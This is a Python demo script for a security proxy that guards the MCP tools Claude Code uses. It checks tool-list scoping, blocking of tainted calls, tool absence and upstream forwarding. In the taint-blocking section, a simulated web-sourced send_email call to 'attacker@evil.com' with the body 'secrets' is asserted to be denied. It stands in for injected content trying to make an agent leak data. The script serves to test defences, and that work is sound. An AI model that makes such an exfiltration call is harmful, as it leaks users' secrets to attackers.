"""
Claude Code real MCP integration demo.

Demonstrates three core guarantees of safe-mcp-proxy as an MCP server:

  1. TOOL SURFACE CONTROL — different worlds expose different tool lists
  2. TAINT BLOCKING       — web-sourced payload is blocked on external-side-effect tools
  3. ABSENT TOOLS         — absent tools are invisible and uncallable

Run:
    python -m demos.integrations.claude_code.demo
"""
import asyncio
import json
import sys
from pathlib import Path

from mcp import McpError

BASE_DIR = Path(__file__).resolve().parents[3]


def _section(title: str) -> None:
    print(f"\n{'=' * 62}")
    print(f"  {title}")
    print("=" * 62)


def _row(label: str, value) -> None:
    print(f"  {label:<36} {value}")


def _make_proxy(world_id=None, simulate=True):
    import hashlib
    from safe_mcp_proxy.approval_store import ApprovalStore
    from safe_mcp_proxy.compiler import compile_world_manifest, resolve_manifest_path
    from safe_mcp_proxy.executor import Executor
    from safe_mcp_proxy.main import _build_policy_engine, _load_simulation_flag
    from safe_mcp_proxy.mcp_server import MCPProxyServer
    from safe_mcp_proxy.registry import ToolRegistry

    manifest_path = resolve_manifest_path(BASE_DIR, world_id)
    manifest_tables = compile_world_manifest(str(manifest_path))
    policy_version = hashlib.sha256(manifest_path.read_bytes()).hexdigest()[:8]
    registry = ToolRegistry.with_mock_tools(
        allowlist=manifest_tables["allowlist"],
        capability_defs=manifest_tables.get("capability_definitions"),
    )
    policy_engine = _build_policy_engine(manifest_tables, "python", BASE_DIR)
    import tempfile
    audit = Path(tempfile.mktemp(suffix=".jsonl"))
    executor = Executor(
        registry=registry,
        policy_engine=policy_engine,
        audit_log_path=audit,
        simulate_external=simulate,
        approval_store=ApprovalStore(),
        world_id=manifest_tables.get("world_id", ""),
        policy_version=policy_version,
    )
    return MCPProxyServer(executor)


async def demo_tool_surface():
    _section("1. TOOL SURFACE CONTROL — tools/list is world-scoped")

    proxy_default = _make_proxy(world_id=None)
    proxy_ro = _make_proxy(world_id="read_only")

    tools_default = [t.name for t in proxy_default._list_tools()]
    tools_ro = [t.name for t in proxy_ro._list_tools()]

    _row("default world tools:", tools_default)
    _row("read_only world tools:", tools_ro)

    assert len(tools_ro) < len(tools_default)
    assert "send_email" not in tools_ro

    print("\n  PASS — same binary, different worlds, different tool surfaces")


async def demo_taint_blocking():
    _section("2. TAINT BLOCKING — web source cannot trigger external side effects")
    from safe_mcp_proxy.provenance import Provenance

    proxy = _make_proxy()
    executor = proxy.executor

    # cli source → read_file → ALLOW (no side effect)
    prov_cli = Provenance.from_source("cli")
    result_cli = executor.execute("read_file", {"path": "README.md"}, prov_cli)
    _row("read_file (cli):", f"{result_cli['decision']} — {result_cli['rule']}")

    # web source → send_email → DENY (tainted + external side effect)
    prov_web = Provenance.from_source("web")
    result_web = executor.execute("send_email", {"to": "attacker@evil.com", "body": "secrets"}, prov_web)
    _row("send_email (web):", f"{result_web['decision']} — {result_web['rule']}")

    assert result_cli["decision"] == "ALLOW"
    assert result_web["decision"] == "DENY"
    assert result_web["rule"] == "tainted_external_side_effect"

    print("\n  PASS — tainted payload blocked deterministically, not by model behaviour")


async def demo_absent_tools():
    _section("3. ABSENT TOOLS — invisible in tools/list, uncallable")

    proxy = _make_proxy(world_id="read_only")
    names = [t.name for t in proxy._list_tools()]
    _row("read_only tool list:", names)
    assert "send_email" not in names

    try:
        await proxy._call_tool("send_email", {})
        print("  FAIL — should have raised McpError")
        sys.exit(1)
    except McpError as e:
        _row("send_email call in read_only:", str(e))

    print("\n  PASS — absent tool raises MCP error (not a crash, not a leak)")


async def demo_upstream_forwarding():
    _section("4. UPSTREAM FORWARDING — ALLOW'd calls reach the real upstream")
    from safe_mcp_proxy.mcp_upstream import UpstreamConnector

    proxy = _make_proxy()
    connector = UpstreamConnector([sys.executable, "-m", "safe_mcp_proxy.mcp_test_server"])
    proxy.upstream = connector
    await connector.connect()
    try:
        result = await proxy._call_tool("read_file", {"path": "README.md"})
        data = json.loads(result[0].text)
        _row("upstream read_file result:", data)
        assert "content" in data
    finally:
        await connector.disconnect()

    print("\n  PASS — ALLOW'd call forwarded to upstream; DENY'd calls never reach it")


async def main():
    print("\n" + "=" * 62)
    print("  Safe MCP Proxy — Claude Code Real Integration Demo")
    print("=" * 62)

    await demo_tool_surface()
    await demo_taint_blocking()
    await demo_absent_tools()
    await demo_upstream_forwarding()

    print("\n" + "=" * 62)
    print("  All 4 guarantees verified.")
    print()
    print("  Connect Claude Code by opening this repo — .mcp.json")
    print("  is discovered automatically and registers safe-mcp-proxy.")
    print("=" * 62 + "\n")


if __name__ == "__main__":
    asyncio.run(main())
